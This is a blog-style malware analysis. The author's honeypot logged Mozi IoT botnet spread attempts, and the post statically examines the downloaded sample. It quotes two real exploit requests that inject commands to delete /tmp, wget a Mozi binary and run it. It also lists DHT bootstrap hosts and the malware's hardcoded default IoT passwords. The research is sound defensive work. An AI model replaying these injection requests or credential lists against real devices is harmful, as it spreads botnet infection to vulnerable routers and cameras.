# MOZI
I'd been tinkering with trying to build my own honeypot system, when I switched to a fresh IP for a new VPS. I had just added a new ability to see the headers and body of web requests being made to server via a discord bot. 

I flipped the switch on and within minutes I had around a dozen unique hosts making identical requests to my honeypot, and it looked like they were infected hosts trying to spread some kind of infection:
```
Connection at 5/1/2021 - 15:20:10 :
GET /shell?cd+/tmp;rm+-rf+*;wget+http://<removed>/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1

Connection at 8/29/2021 - 1:11:35 :
GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://<removed>/:54672/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0
```  

**Interesting**. This web request looks like it's abusing some kind of ![RCE](https://en.wikipedia.org/wiki/Arbitrary_code_execution) trying to download a file, make it executable and run it. The file name in question, `Mozi.a` sounded familiar to me. Looking it up it's a botnet aimed at IoT devices. 



## Taking a Deeper Look 
Watching many hosts continue to trickle in, requesting different versions and using a variety of different request headers, I eventually felt confident enough to start looking at the malware itself. 
```language
HTTP request sent, awaiting response... 200 OK
Length: 307960 (301K) [application/zip]
Saving to: ‘Mozi.m’

Mozi.m                     100%[======================================>] 300.74K   533KB/s    in 0.6s    

2021-08-28 21:34:52 (533 KB/s) - ‘Mozi.m’ saved [307960/307960]
```
The same I downloaded had the following SHA256 sum: 
```language
12013662c71da69de977c04cd7021f13a70cf7bed4ca6c82acbc100464d4b0ef  Mozi.m
```

### Static Analysis

**Strings Found**
```
     	00058c2c 70 dd 03 00     addr       s_dht.transmissionbt.com:6881_0003dd70           = "dht.transmissionbt.com:6881"
        00058c30 8c dd 03 00     addr       s_router.bittorrent.com:6881_0003dd8c            = "router.bittorrent.com:6881"
        00058c34 a8 dd 03 00     addr       s_router.utorrent.com:6881_0003dda8              = "router.utorrent.com:6881"
        00058c38 c4 dd 03 00     addr       s_bttracker.debian.org:6881_0003ddc4             = "bttracker.debian.org:6881"
        00058c3c e0 dd 03 00     addr       s_212.129.33.59:6881_0003dde0                    = "212.129.33.59:6881"
        00058c40 f4 dd 03 00     addr       s_82.221.103.244:6881_0003ddf4                   = "82.221.103.244:6881"
        00058c44 08 de 03 00     addr       s_130.239.18.159:6881_0003de08                   = "130.239.18.159:6881"
        00058c48 1c de 03 00     addr       s_87.98.162.88:6881_0003de1c                     = "87.98.162.88:6881"
```
This looks like some hardcoded domains for the Distributed Hash Table (DHT) the malware uses to maintain it's peer-to-peer network.
There's also a hardcoded list of username/password combinations the malware presumably uses when bruteforcing/attacking hosts during process of spreading infection. Some are obvious bad passwords, others are more interesting:
```language
000594f4 7c ff 03 00     addr       s_CUAdmin_0003ff7c                               = "CUAdmin"
        00059504 94 ff 03 00     addr       s_rapport_0003ff94                               = "rapport"
        00059524 74 ff 03 00     addr       s_admin_0003ff74                                 = "admin"
        0005952c a0 ff 03 00     addr       s_super_0003ffa0                                 = "super"
        00059558 a8 ff 03 00     addr       s_telnetadmin_0003ffa8                           = "telnetadmin"
        0005955c b8 ff 03 00     addr       s_!!Huawei_0003ffb8                              = "!!Huawei"
        0005956c c4 ff 03 00     addr       s_keomeo_0003ffc4                                = "keomeo"
        00059584 cc ff 03 00     addr       s_support_0003ffcc                               = "support"
        0005958c d8 ff 03 00     addr       s_CMCCAdmin_0003ffd8                             = "CMCCAdmin"
        00059590 e4 ff 03 00     addr       s_e8telnet_0003ffe4                              = "e8telnet"
        00059594 f0 ff 03 00     addr       s_e8ehome1_0003fff0                              = "e8ehome1"
        000595b0 10 00 04 00     addr       s_mother_00040010                                = "mother"
        000595dc 18 00 04 00     addr       s_Administrator_00040018                         = "Administrator"
        000595e0 28 00 04 00     addr       s_service_00040028                               = "service"
        000595e4 34 00 04 00     addr       s_supervisor_00040034                            = "supervisor"
        000595e8 40 00 04 00     addr       s_guest_00040040                                 = "guest"
        000595f4 48 00 04 00     addr       s_admin1_00040048                                = "admin1"
        0005967c 88 00 04 00     addr       s_xc3511_00040088                                = "xc3511"
        00059680 90 00 04 00     addr       s_vizxv_00040090                                 = "vizxv"
        00059684 68 00 04 00     addr       s_888888_00040068                                = "888888"
        00059688 7c ff 03 00     addr       s_CUAdmin_0003ff7c                               = "CUAdmin"
        0005968c 98 00 04 00     addr       s_Pon521_00040098                                = "Pon521"
        00059690 a0 00 04 00     addr       s_e2008jl_000400a0                               = "e2008jl"
        00059698 ac 00 04 00     addr       s_r@p8p0r+_000400ac                              = "r@p8p0r+"
        0005969c b8 00 04 00     addr       s_GM8182_000400b8                                = "GM8182"
        000596a0 c0 00 04 00     addr       s_25802580_000400c0                              = "25802580"
        000596a4 cc 00 04 00     addr       s_chzhdpl_000400cc                               = "chzhdpl"
        000596a8 d8 00 04 00     addr       s_Fireitup_000400d8                              = "Fireitup"
        000596b0 ec 00 04 00     addr       s_Zte521_000400ec                                = "Zte521"
```



## Thoughts on the name
Looking up non-malware instances of Mozi, one stood out. According to wikipedia:
 *"Mozi, original name Mo Di (墨翟), was a Chinese philosopher who founded the school of Mohism during the Hundred Schools of Thought period (early portion of the Warring States period of c.475–221 BC). The ancient text Mozi contains material ascribed to him and his followers.Most historians believe that Mozi was a member of the lower artisan class who managed to climb his way to an official post.Mozi was a carpenter and was extremely skilled in creating devices (see Lu Ban). Though he did not hold a high official position, he was sought out by various rulers as an expert on fortification."*